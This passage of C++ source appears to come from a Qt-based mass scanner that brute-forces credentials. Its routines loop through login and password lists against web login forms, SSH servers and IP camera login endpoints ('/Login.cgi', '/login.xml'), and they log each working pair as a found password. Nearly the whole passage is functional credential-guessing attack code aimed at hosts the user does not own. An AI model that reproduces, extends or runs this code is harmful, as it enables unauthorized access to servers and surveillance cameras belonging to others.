				if(BALogSwitched) stt->doEmitionBAData("Probing " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(wfLoginLst[i]) + ":" + QString(wfPassLst[j]));

				if(port == 443) cRes = con._EstablishSSLConnection(ip, port, request, &CSTR);
				else cRes = con._EstablishConnection(ip, port, request, &CSTR);


				if(CSTR.lowerBuff != NULL)
				{
					if(strstri(CSTR.lowerBuff, "501 not implemented") != NULL)
					{
						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 501 Not Implemented.");						
						OnLiner = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
					if(strstri(CSTR.lowerBuff, "404 not found") != NULL)
					{
						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 404 Not Found.");						
						OnLiner = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
					if(strstri(CSTR.lowerBuff, "Access is Denied") == NULL
						&& strstri(CSTR.lowerBuff, "Location:") == NULL
						&& strstri(CSTR.lowerBuff, "Access forbidden") == NULL
						&& strstri(CSTR.lowerBuff, "Authentication required") == NULL
						&& strstri(CSTR.lowerBuff, "invalid") == NULL
						&& strstri(CSTR.lowerBuff, "error") == NULL
						&& strstri(CSTR.lowerBuff, "loginerr") == NULL
						&& strstri(CSTR.lowerBuff, "passerr") == NULL
						&& strstri(CSTR.lowerBuff, "passworderr") == NULL
						&& strstri(CSTR.lowerBuff, "location.href") == NULL
						&& strstri(CSTR.lowerBuff, "location.replace") == NULL
						&& strstri(CSTR.lowerBuff, "top.location") == NULL
						&& strstri(CSTR.lowerBuff, "error_status") == NULL
						&& strstri(CSTR.lowerBuff, "http-equiv=\"refresh\"") == NULL
						&& strstri(CSTR.lowerBuff, "http-equiv = \"refresh\"") == NULL
						&& strstri(CSTR.lowerBuff, "busy") == NULL
						&& strstri(CSTR.lowerBuff, "later") == NULL
						&& strstri(CSTR.lowerBuff, formVal) == NULL
						)
					{
						if(i == 0) 
						{
							ZeroMemory(request, 2048);
							ZeroMemory(argData, 256);

							OnLiner = 0;

							strcpy(lps.login, "UNKNOWN");
							return lps;
						};
						char pass[256] = {0};

						ZeroMemory(pass, 256);
						strcpy(pass, ip);
						strcat(pass, " - Web Form password found: ");
						strcat(pass, wfLoginLst[i]);
						strcat(pass, ":");
						strcat(pass, wfPassLst[j]);
						OnLiner = 0;
#pragma region QTGUI_Area
						stt->doEmition_BAGreenData("[+] " + QString(pass));
#pragma endregion
						strcpy(lps.login, wfLoginLst[i]);
						strcpy(lps.pass, wfPassLst[j]);
						return lps;
					};
				}
				else
				{
					ZeroMemory(request, 2048);
					ZeroMemory(argData, 256);

					OnLiner = 0;

					strcpy(lps.login, "UNKNOWN");
					return lps;
				};
				if(i == 0) ++i;
				ZeroMemory(request, 2048);
				ZeroMemory(argData, 256);
			};
		};
	}
	else
	{
		stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Unknown method.");
	};

	ZeroMemory(request, 2048);
	ZeroMemory(argData, 256);

	OnLiner = 0;

	strcpy(lps.login, "UNKNOWN");
	return lps;
};
lopaStr Connector::_WFLobby(char *cookie, char *ip, int port, char *methodVal, char *actionVal, char *userVal, char *passVal, char *formVal)
{
	++WF;
	BConInc();
	lopaStr res = _WFBrut(cookie, ip, port, methodVal, actionVal, userVal, passVal, formVal);
	BConDec();
	return res;
};
#pragma endregion

#pragma region SSH

int _sshConnect(char *user, char *pass, char *host)
{
	char hostStr[128] = {0};
	ZeroMemory(hostStr, 128);
	strcpy(hostStr, user);
	strcat(hostStr, "@");
	strcat(hostStr, host);

	ssh_session my_ssh_session = ssh_new();
	if (my_ssh_session == NULL)
	{
		ssh_free(my_ssh_session);
		return -1;
	};

	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostStr);
	//ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
	//ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY_STR, &verbosity);
	//ssh_options_set(my_ssh_session, SSH_OPTIONS_STRICTHOSTKEYCHECK, 0);
	int sshTimeout = gTimeOut + 1;
	ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &sshTimeout);

	int rc = ssh_connect(my_ssh_session);

	if (rc != SSH_OK)
	{
		ssh_disconnect(my_ssh_session);
		ssh_free(my_ssh_session);
		++offlines;
		return -2;
	}
	else
	{
		rc = ssh_userauth_password(my_ssh_session, NULL, pass);
		if (rc != SSH_AUTH_SUCCESS)
		{
			ssh_disconnect(my_ssh_session);
			ssh_free(my_ssh_session);
			return -1;
		};
	};
	ssh_disconnect(my_ssh_session);
	ssh_free(my_ssh_session);
	++ssh;
	return 0;
};
char *_get_ssh_banner(char *ip)
{
	Connector con;
	conSTR CSTR;
	char recvBuff[256] = {0};
	con._EstablishConnection(ip, 22, "", &CSTR);
	if(CSTR.lowerBuff != NULL && CSTR.size != 0)
	{
		strncpy(recvBuff, CSTR.lowerBuff, CSTR.size < 256 ? CSTR.size : 256);
	};
	if(CSTR.lowerBuff != NULL) 
	{
		delete []CSTR.lowerBuff;
		CSTR.lowerBuff = NULL;
	};
	return recvBuff;
};
int check_ssh_pass(char *user, char *pass, char *userPass, char *host, conSTR *CSTR, char *banner)
{
	int res = -1;
	if(BALogSwitched) stt->doEmitionBAData("Probing ssh: " + QString(user) + ":" + QString(pass) + "@" + QString(host));
	res = _sshConnect(user, pass, host);
	if(res == 0)
	{
		stt->doEmition_BAGreenData("[+] SSH: " + QString(user) + ":" + QString(pass) + "@" + QString(host));
		char goodStr[512] = {0};
		strcpy(goodStr, userPass);
		strcat(goodStr, "@");
		strcat(goodStr, host);
		strcat(goodStr, "|+|");
		strcat(goodStr, banner);
		int bsz = strlen(goodStr);
		CSTR->lowerBuff = new char[bsz + 1];
		ZeroMemory(CSTR->lowerBuff, sizeof(CSTR->lowerBuff));
		CSTR->size = bsz;
		strncpy(CSTR->lowerBuff, goodStr, bsz);
		memset(CSTR->lowerBuff + bsz, '\0', 1);
		return 0;
	};
	return res;
};
int _EstablishSSHConnection(char *host, conSTR *CSTR, char *banner)
{
	CSTR->lowerBuff = NULL;
	CSTR->size = 0;
	char login[32] = {0};
	char pass[32] = {0};
	char temp[64] = {0};
	OnLiner = 1;
	SSHConInc();
	int sz = 0;
	char *ptr1 = 0;
	int res = -1;
	for(int i = 0; i < MaxSSHPass; ++i)
	{
		if(globalScanFlag == false) break;		
		strcpy(temp, sshlpLst[i]);
		ptr1 = strstr(temp, ":");
		sz = ptr1 - temp;
		strncpy(login, temp, sz);
		strcpy(pass, ptr1 + 1);
		res = check_ssh_pass(login, pass, temp, host, CSTR, banner);
		if(res == 0) 
		{
			ZeroMemory(login, 32);
			ZeroMemory(pass, 32);
			ZeroMemory(temp, 64);
			SSHConDec();
			OnLiner = 0;
			return 0;
		}
		else if(res == -2)
		{
			ZeroMemory(login, 32);
			ZeroMemory(pass, 32);
			ZeroMemory(temp, 64);
			SSHConDec();
			OnLiner = 0;
			return -2;
		};
		ZeroMemory(login, 32);
		ZeroMemory(pass, 32);
		ZeroMemory(temp, 64);
		Sleep(500);
	};
	SSHConDec();
	OnLiner = 0;
	return -1;
};
#pragma endregion

#pragma region IPCAMWeb
int checkGEO(char *login, char *pass, char *ip, int port)
{
	char request[1024] = {0};
	char recvBuff[256] = {0};
	char recvBuff2[4096] = {0};

	strcpy(request, "GET /Login.cgi?username=");
	strcat(request, login);
	strcat(request, "&password=");
	strcat(request, pass);
	strcat(request, " HTTP/1.1\r\nHost: ");
	strcat(request, ip);
	strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\nContent-length: 0\r\n\r\n");

	SOCKET sock;
	sockaddr_in sockAddr;
	int bTO; 
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);
	HOSTENT *host;  
#if defined(WIN32)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[GEOvis] Bad address! [" + QString(ip) + "]");
#pragma endregion
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[GEOvis] Bad address! [" + QString(ip) + "]");
#pragma endregion
	};
#endif
	sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	int cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
	int cErrCode = WSAGetLastError();

	while(cErrCode == 10038)
	{
		shutdown(sock, SD_BOTH);
		closesocket(sock);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
		cErrCode = WSAGetLastError();
		if(gDebugMode) stt->doEmitionDebugFoundData("[GEOvis] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
	};

	if(BALogSwitched) stt->doEmitionBAData("Probing IPC" + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(login) + ":" + QString(pass));

	if(cCode != SOCKET_ERROR) 
	{
		int x = 1;
		Activity += strlen(request);

		if(send(sock, request, strlen(request), 0) == SOCKET_ERROR) 	
		{
#pragma region QTGUI_Area
			stt->doEmitionRedFoundData("[GEOvis] Send error! [" + QString(ip) + "]");
#pragma endregion
			shutdown(sock, SD_BOTH);
			closesocket(sock);
			return 0;
		}
		else 
		{
			if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
			int x = 1;
			int xx = 0;
			while(xx < 4096)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut + 2, &bTO);
				if(x == 0) break;
				strcat(recvBuff2, recvBuff);
				xx += x;
				Activity += x;
			};

			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));

			if(strstri(recvBuff2, "Access denied") == NULL && strstri(recvBuff2, "ErrNoSuchUsr.htm") == NULL)
			{
				shutdown(sock, SD_BOTH);
				closesocket(sock);
				return 1;
			};
		};
	};

	shutdown(sock, SD_BOTH);
	closesocket(sock);
	return 0;
};
int checkIPC(char *login, char *pass, char *ip, int port)
{
	char request[512] = {0};
	char recvBuff[256] = {0};
	char recvBuff2[4096] = {0};
	strcpy(request, "GET /login.xml?user=");
	strcat(request, login);
	strcat(request, "&usr=");
	strcat(request, login);
	strcat(request, "&password=");
	strcat(request, pass);
	strcat(request, "&pwd=");
	strcat(request, pass);
	strcat(request, " HTTP/1.1\r\nHost: ");
	strcat(request, ip);
	strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\nContent-length: 0\r\n\r\n");

	SOCKET sock;
	sockaddr_in sockAddr;
	int bTO; 
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);
	HOSTENT *host;  
#if defined(WIN32)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[IPCam] Bad address! [" + QString(ip) + "]");
#pragma endregion
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData("[IPCam] Bad address! [" + QString(ip) + "]");
#pragma endregion
	};
#endif
	sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	int cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
	int cErrCode = WSAGetLastError();

	while(cErrCode == 10038)
	{
		shutdown(sock, SD_BOTH);
		closesocket(sock);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
		cErrCode = WSAGetLastError();
		if(gDebugMode) stt->doEmitionDebugFoundData("[IPCam] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
	};

	if(BALogSwitched) stt->doEmitionBAData("Probing IPC" + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(login) + ":" + QString(pass));

	if(cCode != SOCKET_ERROR) 
	{
		int x = 1;
		Activity += strlen(request);

		if(send(sock, request, strlen(request), 0) == SOCKET_ERROR) 	
		{
#pragma region QTGUI_Area
			stt->doEmitionRedFoundData("[IPCam] Send error! [" + QString(ip) + "]");
#pragma endregion
			shutdown(sock, SD_BOTH);
			closesocket(sock);
			return 0;
		}
		else 
		{
			if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
			int x = 1;
			int xx = 0;
			while(xx < 4096)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut + 2, &bTO);
				if(x == 0) break;
				strcat(recvBuff2, recvBuff);
				xx += x;
				Activity += x;
			};

			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));

			if(strstri(recvBuff2, "<UserGroup>Invalid</UserGroup>") == NULL)
			{
				shutdown(sock, SD_BOTH);
				closesocket(sock);
				return 1;
			};
		};
	};

	shutdown(sock, SD_BOTH);
	closesocket(sock);
	return 0;
};
lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	OnLiner = 1;
	for(int i = 0; i < MaxLogin; i++)
	{
		if(globalScanFlag == false) break;
		for(int j = 0; j < MaxPass; j++)
		{
			if(globalScanFlag == false) break;

			if(strcmp(SPEC, "IPC") == 0)
			{
				if(checkIPC(loginLst[i], passLst[j], ip, port) == 1)
				{
					OnLiner = 0;
					strcpy(lps.login, loginLst[i]);
					strcpy(lps.pass, passLst[j]);
					return lps;
				};
			}
			else if(strcmp(SPEC, "GEO") == 0)
			{
				if(checkGEO(loginLst[i], passLst[j], ip, port) == 1)
				{
					OnLiner = 0;
					strcpy(lps.login, loginLst[i]);
					strcpy(lps.pass, passLst[j]);
					return lps;
				};
			}
			else
			{
				stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");						
			};
		};
	};
	OnLiner = 0;
	strcpy(lps.login, "UNKNOWN");
	return lps;
};
lopaStr Connector::_IPCameraBLobby(char *ip, int port, char *SPEC)
{
	BConInc();
	lopaStr res = _IPCameraBrute(ip, port, SPEC);
	BConDec();
	return res;
};
#pragma endregion

QString strIP;
QString strPort;
const char *buff1 = "GET / HTTP/1.1\r\nHost: ";
const char *buff2 = "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\nContent-length: 0\r\n\r\n";
void Connector::_ConnectToPort(char *ip, const char *portC, char *hl)											
{	
	char mes[512] = {0};
	conSTR CSTR;
	CSTR.lowerBuff = NULL;
	CSTR.size = 0;

	int strFlag = 0;
	strcpy(mes, buff1);
	strcat(mes, ip);
	strcat(mes, buff2);
	int port = atoi(portC);
	int cRes;
	
	if(port == 443) cRes = _EstablishSSLConnection(ip, port, mes, &CSTR);
	else if(port == 22) 
	{
		char banner[256] = {0};
		strncpy(banner, _get_ssh_banner(ip), 256);
		if(strlen(banner) > 0)
		{
			cRes = _EstablishSSHConnection(ip, &CSTR, banner);
		};
	}
	else cRes = _EstablishConnection(ip, port, mes, &CSTR);
	int size = CSTR.size;

	if(size > 0 && cRes != -1)
	{
		++Alive;
		++found;
		stt->doEmitionChangeParsed(QString::number(saved) + "/" + QString::number(found));

		Lexems lx;
		lx._filler(port, CSTR.lowerBuff, ip, size, &lx, hl);
		delete []CSTR.lowerBuff;
		CSTR.lowerBuff = NULL;
	};

	if(CSTR.lowerBuff != NULL) 
	{
		delete []CSTR.lowerBuff;
		CSTR.lowerBuff = NULL;
	};
	strFlag = 1;
};